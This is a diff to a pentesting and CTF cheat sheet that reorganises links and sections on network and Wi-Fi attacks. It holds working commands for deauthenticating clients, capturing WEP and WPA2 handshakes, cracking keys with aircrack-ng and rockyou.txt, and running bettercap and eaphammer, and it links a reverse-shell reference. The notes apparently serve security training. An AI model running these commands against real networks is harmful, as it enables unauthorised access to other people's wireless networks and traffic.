@@ -1,13 +1,12 @@
 ## Documentation
 
 - https://ctf-wiki.mahaloz.re/misc/traffic/introduction/
-- https://www.cyberciti.biz/files/pdf/dig%20command%20cheat%20sheet.pdf
 - https://cheatsheet.haax.fr/shells-methods/reverse/
 - https://github.com/sergiomarotco/Network-segmentation-cheat-sheet
-- https://www.orangecyberdefense.com/fr/insights/blog/ethical-hacking/etat-de-lart-du-pivoting-reseau-en-2019
 - https://heystacks.com/doc/401/attacking-secondary-contexts-in-web-applications
-- https://github.com/V0lk3n/WirelessPentesting-CheatSheet
 - https://www.wifi-professionals.com/2019/01/4-way-handshake
+- https://book.hacktricks.wiki/en/generic-methodologies-and-resources/pentesting-wifi/index.html
+- http://web.archive.org/web/20220612232400/https://www.orangecyberdefense.com/fr/insights/blog/ethical-hacking/etat-de-lart-du-pivoting-reseau-en-2019
 
 ## Cours
 
@@ -17,6 +16,7 @@
 
 ## Tools
 
+- [Alfa antennas - dongle USB](https://www.alfa.com.tw/)
 - [Bettercap](https://www.bettercap.org/installation/)
 - [Eaphammer](https://github.com/s0lst1c3/eaphammer)
 - [GQRX](https://github.com/gqrx-sdr/gqrx), [GNURadio](https://wiki.gnuradio.org/index.php/Main_Page)
@@ -288,10 +288,9 @@ firefox $(ip a s eth0 | awk -F'[/ ]+' '/inet[^6]/{print $3}')/page #http://vulne
 
 ## Wifi
 
-- https://www.alfa.com.tw/
 - https://github.com/derv82/wifite
-- https://dl.aircrack-ng.org/breakingwepandwpa.pdf
 - https://github.com/V0lk3n/WirelessPentesting-CheatSheet
+- https://book.hacktricks.wiki/en/generic-methodologies-and-resources/pentesting-wifi/index.html
 
 ```bash
 sudo wifite -mac --kill -v
@@ -309,16 +308,17 @@ sudo iw wlanx info
 sudo wireshark&
 ```
 
-### WEP
+### WEP & WPA (TKIP => RC4)
+
+- https://www.aircrack-ng.org/doku.php?id=cracking_wpa
+- https://dl.aircrack-ng.org/breakingwepandwpa.pdf
 
 ```txt
 #wep challenge in wireshark
 wlan.fc.type_subtype == 0x0020
 ```
 
-- https://tbhaxor.com/decrypt-wep-traffic-with-insufficient-ivs/
-
-*Authentification*
+#### Authentification
 ```txt
 response = challenge ^ RC4(iv|psk)
 
@@ -328,7 +328,7 @@ psk = 5 chars = 40 bits <-> key = iv|psk = 64 bits
 psk = 13 chars = 104 bits <-> key = iv|psk = 128 bits
 ```
 
-*Capture*
+#### Capture
 
 ```bash
 sudo su
@@ -338,7 +338,7 @@ airodump-ng --bssid 68:A3:78:01:C9:EF -w wep wlan0mon #find bssid (last command)
 airodump-ng stop wlan0mon #set back monitor->managed
 ```
 
-*Bruteforce*
+#### Tests & Bruteforce
 
 ```bash
 # -a 1 = wep (default)
@@ -347,19 +347,22 @@ airdecap-ng -w $(echo "test1test1tes" |xxd -ps) -b 68:A3:78:01:C9:EF  wep-01.cap
 aircrack-ng -w rockyou.txt -b 68:A3:78:01:C9:EF -n 128 wep-01.cap 		 #n = length key
 ```
 
-### WPA2 - PSK
+### WPA2 (CCMP = AES 128 CBC-MAC)
 
-- https://www.aircrack-ng.org/doku.php?id=cracking_wpa
+- https://www.krackattacks.com/
+- https://www.wifi-professionals.com/2019/01/4-way-handshake
 - https://www.evilsocket.net/2019/02/13/Pwning-WiFi-networks-with-bettercap-and-the-PMKID-client-less-attack/
 
-#### Aircrack
+#### Deauth + 4 way handshake capture + Bruteforce
+
+**Aircrack**
 
 ```bash
 # -a 2 = wpa-psk
 aircrack-ng -a 2 -w rockyou.txt -b 68:A3:78:01:C9:EF wpa-01.cap
 ```
 
-#### Bettercap
+**Bettercap**
 
 ```bash
 sudo docker run -it --privileged --rm --net=host bettercap/bettercap -iface wlanx
@@ -368,7 +371,11 @@ sudo docker run -it --privileged --rm --net=host bettercap/bettercap -iface wlan
 wpapcap2john bettercap-wifi-handshakes.pcap
 ```
 
-### WPA2 - EAP
+#### PMKID & WPS PIN attacks
+
+Use **wifite2**
+
+### WPA2-EAP | WPA-MGT (Entreprise)
 
 ```bash
 sudo python3 ./eaphammer –cert-wizard
